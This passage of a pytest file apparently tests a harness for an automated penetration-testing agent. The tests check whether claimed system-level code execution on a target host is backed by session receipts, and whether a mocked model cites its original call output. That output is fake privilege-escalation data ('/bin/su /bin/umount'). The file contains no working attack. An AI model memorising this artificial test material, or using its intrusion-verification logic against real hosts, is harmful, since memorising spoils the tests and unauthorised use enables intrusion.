        with pytest.raises(SystemExit, match="received before registration"):
            session_delivery.finish_session_delivery(**case.options)
    if replacement == "lower_id":
        case.listing["0"] = dict(case.listing["3"], uuid="uuid-0")
    elif replacement == "changed_uuid":
        case.listing["3"]["uuid"] = "replacement-incarnation"
    else:
        del case.listing["3"]
    receipt = session_delivery.finish_session_delivery(**case.options)
    if replacement == "lower_id":
        assert receipt["state"] == "completed"
        assert receipt["sessions"] == ["3"]
        assert receipt["received_session"]["uuid"] == "uuid-3"
        assert case.registered == case.probed == ["3"]
    else:
        assert receipt["state"] == "unknown"
        assert "SESSION_DELIVERY_RECEIVED_BINDING_CHANGED" in receipt["reason"]
        assert case.registered == case.probed == []


def test_repeat_callbacks_still_require_identity_evidence(repeat_delivery_case, monkeypatch):
    case = repeat_delivery_case
    monkeypatch.setattr(sessions, "probe",
                        lambda *args, **kwargs: (True, "SESSION_PROBE_CONFIRMED"))
    receipt = session_delivery.finish_session_delivery(**case.options)
    assert receipt["state"] == "unknown"
    assert "IDENTITY_SNAPSHOT_UNCONFIRMED" in receipt["reason"]
    verdict = backstops.backstop_exec_code(
        criterion={"ref": "6", "logical": "pc1", "privilege": "system"},
        sessions=session_registry.snapshot(case.root), node_id="19",
        delivery=receipt, expected_delivery_owner=case.plan["owner"])
    assert verdict["verdict"] == "UNKNOWN"
    assert verdict["reason"] == "EXEC_DELIVERY_NOT_COMPLETED"


@pytest.mark.parametrize("failure", ["rpc", "node", "no_match"])
def test_pre_receipt_failures_keep_the_attempt_identity(
        repeat_delivery_case, monkeypatch, failure):
    from runtime import session_delivery_finish
    case = repeat_delivery_case
    if failure == "rpc":
        def unavailable(*args, **kwargs):
            raise RuntimeError("query unavailable")
        monkeypatch.setattr(session_io, "rpc_call", unavailable)
        expected_reason = "query unavailable"
    elif failure == "node":
        case.plan["node_id"] = "7"
        session_delivery_finish._save_delivery_plan(case.root, case.plan)
        expected_reason = "SESSION_DELIVERY_NODE_MISMATCH"
    else:
        from types import SimpleNamespace
        import time
        ticks = iter((0.0, 0.0, 100.0))
        monkeypatch.setattr(session_delivery_finish, "time", SimpleNamespace(
            time=time.time, monotonic=lambda: next(ticks, 100.0),
            sleep=lambda _: pytest.fail("no wait required")))
        expected_reason = "SESSION_DELIVERY_NO_MATCH"
    receipt = session_delivery.finish_session_delivery(**case.options)
    assert receipt["state"] == "unknown"
    assert expected_reason in receipt["reason"]
    assert receipt["node_id"] == "19"
    assert receipt["delivery_owner"] == case.plan["owner"]
    assert case.registered == case.probed == []


@pytest.mark.parametrize("delivery,reason", [
    (None, "EXEC_DELIVERY_RECEIPT_MISSING"),
    ({}, "EXEC_DELIVERY_ATTRIBUTION_UNCONFIRMED"),
    ({"state": "unknown", "node_id": "19"}, "EXEC_DELIVERY_ATTRIBUTION_UNCONFIRMED"),
    ({"state": "unknown", "delivery_owner": "delivery-" + "a" * 32},
     "EXEC_DELIVERY_ATTRIBUTION_UNCONFIRMED"),
    ({"state": "unknown", "node_id": "19", "delivery_owner": "delivery-" + "a" * 32},
     "EXEC_DELIVERY_NOT_COMPLETED"),
    ({"state": "unknown", "node_id": "7", "delivery_owner": "delivery-" + "a" * 32},
     "EXEC_DELIVERY_NODE_MISMATCH"),
    ({"state": "unknown", "node_id": "19", "delivery_owner": "delivery-" + "b" * 32},
     "EXEC_DELIVERY_OWNER_MISMATCH"),
])
def test_delivery_failure_attribution_is_honest(delivery, reason):
    verdict = backstops.backstop_exec_code(
        criterion={"ref": "6", "logical": "pc1", "privilege": "system"},
        node_id="19", delivery=delivery,
        expected_delivery_owner="delivery-" + "a" * 32)
    assert verdict["verdict"] == "UNKNOWN"
    assert verdict["reason"] == reason
    assert assessment._machine_inconclusive(reason) is False


def test_no_delivery_context_preserves_node_owned_evidence():
    row = {"kind": "console_session", "source_node": "19", "host": "192.0.2.30",
           "channel_id": "kept", "session_id": "1", "lifecycle": "registered",
           "identity": {"user": "nt authority\\system", "environment": "host",
                        "call_id": "call-identity"}}
    verdict = backstops.backstop_exec_code(
        criterion={"ref": "6", "logical": "pc1", "privilege": "system"},
        sessions=[row], host_map={"pc1": "192.0.2.30"}, node_id="19")
    assert verdict["verdict"] == "TRUE"


def test_repeat_receipt_and_conclusion_discipline_reach_the_model(tmp_path, monkeypatch):
    from agents._model.contract import ModelReply
    from scripts import run_lean_task as cli
    from tests.test_lean_task_support import SCOPE, card, native_client, task

    sentence = (
        "Before finish, compare each claim about a call (including empty "
        "stdout) with that exact call's recorded receipt; after "
        "LEAN_CALL_ALREADY_RAN, use the original receipt, and do not base "
        "any verdict on a claim that contradicts it.")
    executor, calls = native_client(monkeypatch, body=b"/bin/su /bin/umount")
    prompts, original_ids = [], []

    class Client:
        def available(self):
            return True

        def complete(self, **kwargs):
            assert sentence in kwargs["system"]
            state = json.loads(kwargs["user"])
            prompts.append(state)
            if len(prompts) <= 2:
                action = {"tool": "http", "method": "GET", "path": "/"}
            else:
                receipt = next(row["receipt"] for row in state["history"]
                               if row.get("kind") == "receipt")
                refusal = next(row["refusal"] for row in state["history"]
                               if row.get("kind") == "refusal"
                               and row["refusal"]["reason_code"] == "LEAN_CALL_ALREADY_RAN")
                assert "/bin/su /bin/umount" in receipt["stdout"]
                assert refusal["already_ran"][0]["call_id"] == receipt["call_id"]
                original_ids.append(receipt["call_id"])
                action = {"tool": "finish",
                          "claim": "The recorded output is nonempty; escalation remains uncertain.",
                          "verdict": "uncertain",
                          "citations": [{"call_id": receipt["call_id"],
                                         "quote": "/bin/su /bin/umount"}]}
            return ModelReply(ok=True, text=json.dumps(action), payload=action, model="offline")

    result = cli.drive(card(), task(), SCOPE, executor,
                       client=Client(), run_dir=tmp_path, max_steps=4)
    assert len(prompts) == 3
    assert sum(row[0] == "request" for row in calls) == 1
    assert result["citations"][0]["call_id"] == original_ids[0]
    assert result["claimed_verdict"] == "uncertain"
    assert result["reason"] == "MODEL_CLAIM_NOT_MACHINE_VERIFIED"
